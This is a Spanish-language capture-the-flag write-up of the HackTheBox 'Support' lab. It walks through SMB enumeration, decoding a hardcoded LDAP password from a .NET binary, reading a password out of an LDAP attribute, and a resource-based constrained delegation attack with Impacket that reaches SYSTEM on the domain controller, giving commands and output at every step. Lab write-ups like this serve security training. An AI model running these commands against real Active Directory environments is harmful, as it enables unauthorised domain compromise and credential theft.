---
title: "HackTheBox - Support"
date: 2026-10-13
categories:
  - hacking
  - htb
tags:
  - active-directory
  - ldap
  - kerberos
  - rbcd
  - windows
---

## Nmap

Buscamos los puertos abiertos para el host.

```bash
❯ sudo nmap -sS -Pn --open --min-rate 5000 10.129.230.181 -oG port
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-12 12:17 CEST
Nmap scan report for 10.129.230.181
Host is up (0.089s latency).
Not shown: 988 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

Versiones y servicios abiertos.

```bash
❯ nmap -sCV -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985 10.129.230.181 -oN target
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-12 12:19 CEST
Nmap scan report for 10.129.230.181
Host is up (0.042s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-12 10:19:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-12T10:19:32
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## NXC SMB

Observamos las carpetas compartidas donde tenemos derechos de lectura en la carpeta conpartida support-tools.

```bash
❯ nxc smb 10.129.230.181 -u 'guest' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\guest: 
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                        Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share 
```

Me conecté al recurso SMB support-tools y descargué todos los archivos disponibles mediante mget *, desactivando la confirmación individual para cada descarga.

```bash
❯ smbclient //10.129.230.181/support-tools -U
Password for [WORKGROUP\rodgar]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

		4026367 blocks of size 4096. 959493 blocks available
smb: \> 
```

## 7z

Descomprimí UserInfo.exe.zip con 7-Zip y obtuve el ejecutable UserInfo.exe junto con sus DLL y archivo de configuración, por lo que puedo analizar la herramienta para identificar posibles vulnerabilidades.

```bash
❯ 7z x UserInfo.exe.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 277499 bytes (271 KiB)

Extracting archive: UserInfo.exe.zip
--
Path = UserInfo.exe.zip
Type = zip
Physical Size = 277499

Everything is Ok

Files: 12
Size:       652675
Compressed: 277499
```

```bash
❯ ls -l
.rw-rw-r-- rodgar rodgar  98 KB Tue Mar  1 19:18:50 2022  CommandLineParser.dll
.rw-rw-r-- rodgar rodgar  22 KB Sat Oct 23 01:42:08 2021  Microsoft.Bcl.AsyncInterfaces.dll
.rw-rw-r-- rodgar rodgar  46 KB Sat Oct 23 01:48:04 2021  Microsoft.Extensions.DependencyInjection.Abstractions.dll
.rw-rw-r-- rodgar rodgar  83 KB Sat Oct 23 01:48:22 2021  Microsoft.Extensions.DependencyInjection.dll
.rw-rw-r-- rodgar rodgar  63 KB Sat Oct 23 01:51:24 2021  Microsoft.Extensions.Logging.Abstractions.dll
.rw-rw-r-- rodgar rodgar  20 KB Wed Feb 19 11:05:18 2020  System.Buffers.dll
.rw-rw-r-- rodgar rodgar 138 KB Wed Feb 19 11:05:18 2020  System.Memory.dll
.rw-rw-r-- rodgar rodgar 113 KB Tue May 15 15:29:44 2018  System.Numerics.Vectors.dll
.rw-rw-r-- rodgar rodgar  18 KB Sat Oct 23 01:40:18 2021  System.Runtime.CompilerServices.Unsafe.dll
.rw-rw-r-- rodgar rodgar  25 KB Wed Feb 19 11:05:18 2020  System.Threading.Tasks.Extensions.dll
.rwxrwxr-x rodgar rodgar  12 KB Fri May 27 19:51:05 2022  UserInfo.exe
.rw-rw-r-- rodgar rodgar 563 B  Fri May 27 18:59:39 2022  UserInfo.exe.config
.rw-r--r-- rodgar rodgar 271 KB Mon Oct 12 12:26:24 2026  UserInfo.exe.zip
```

## Monodis

Analicé UserInfo.exe con monodis y grep para extraer las cadenas de texto del ejecutable. Encontré credenciales potenciales (armando y una cadena cifrada), además de la ruta LDAP LDAP://support.htb y el usuario support\ldap, que podrían servir para investigar la autenticación y enumerar Active Directory.

```bash
❯ monodis UserInfo.exe | grep -i "ldstr"
	 IL_0010:  ldstr "UserInfo.exe"
	IL_0000:  ldstr "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
	IL_000f:  ldstr "armando"
	IL_000d:  ldstr "LDAP://support.htb"
	IL_0012:  ldstr "support\\ldap"
	IL_0001:  ldstr "find"
	IL_000b:  ldstr "Find a user"
	IL_0001:  ldstr "user"
	IL_000b:  ldstr "Get information about a user"

    ~/Desktop/HTBOX/content  
```

Descifré la cadena en Base64 aplicando una operación XOR con la clave armando y la constante 0xDF byte a byte, obteniendo así el texto original que podría corresponder a una contraseña.

```python
import base64
enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
data = base64.b64decode(enc)
out = bytes((b ^ key[i % len(key)]) ^ 0xDF for i, b in enumerate(data))
print(out.decode())
```

## LDAP

OK Ahora despues de lo anterior me autentiqué en el servicio LDAP con las credenciales obtenidas y consulté el atributo info del usuario support. La consulta fue exitosa y reveló una cadena (Ironside47pleasure40Watchful) que podría ser una contraseña útil.

```bash
❯ ldapsearch -x -H ldap://10.129.230.181 -D "ldap@support.htb"  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(samaccountname=support)" info
# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (samaccountname=support)
# requesting: info 
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

## Evil-Winrm

Me conecté al equipo mediante Evil-WinRM usando las credenciales del usuario support y obtuve acceso a una shell remota de PowerShell, confirmando que las credenciales son válidas.

```bash
❯ evil-winrm -i 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> 
```

## Bloodhound

Ejecuté bloodhound-python con las credenciales de support para enumerar Active Directory. Recopilé información del dominio, incluyendo 21 usuarios, 53 grupos, 2 GPO y 1 equipo, y exporté los resultados a un archivo ZIP para analizarlos.

```bash
❯ bloodhound-python -u 'support' -p 'Ironside47pleasure40Watchful' -c All --zip -ns 10.129.230.181 -d support.htb
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.support.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 09S
INFO: Compressing output into 20261012134629_bloodhound.zip
```

Ok estamos en el punto clave. Tenemos GenericAll sobre el objeto computer DC.SUPPORT.HTB es oro, permite un ataque de Resource-Based Constrained Delegation (RBCD) para acabar con un ticket de Administrator contra el DC. Por qué RBCD y no cambiar la contraseña directamente.

Podrías tener la tentación de resetear la contraseña del propio DC con GenericAll, pero eso rompería la confianza del dominio y es destructivo. El camino limpio es el siguiente.

![HTB Support - BloodHound GenericAll](/assets/images/HTB-Support/1.png)

## Privilege escalation

Ok creamos una cuenta de maquina usando las credenciales que ya poseemos.

```bash
❯ impacket-addcomputer -computer-name 'PWNED$' -computer-pass 'Password123!' -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account PWNED$ with password Password123!.
```

Numero dos creamos un RBCD en el DC apuntando a la cuenta recién creada

```bash
❯ impacket-rbcd -delegate-from 'PWNED$' -delegate-to 'DC$' -action write -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] PWNED$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     PWNED$       (S-1-5-21-1677581083-3380853377-188903654-6101)
```

Como tercera parte solicitamos un TGS impersonando Administrator:

```bash
❯ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator  -dc-ip 10.129.230.181 'support.htb/PWNED$:Password123!' 2>/dev/null
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Y por ultimo lo mas importante Utilicé el ticket Kerberos de Administrator para autenticarme contra dc.support.htb con impacket-psexec. Conseguí acceso remoto al controlador de dominio y, al ejecutar whoami, confirmé que tengo privilegios de NT AUTHORITY\SYSTEM.

```bash
❯ export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache && impacket-psexec -k -no-pass -dc-ip 10.129.230.181 dc.support.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file aBOHCwSr.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service jwkK on dc.support.htb.....
[*] Starting service jwkK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami 
nt authority\system

C:\Windows\system32> 
```
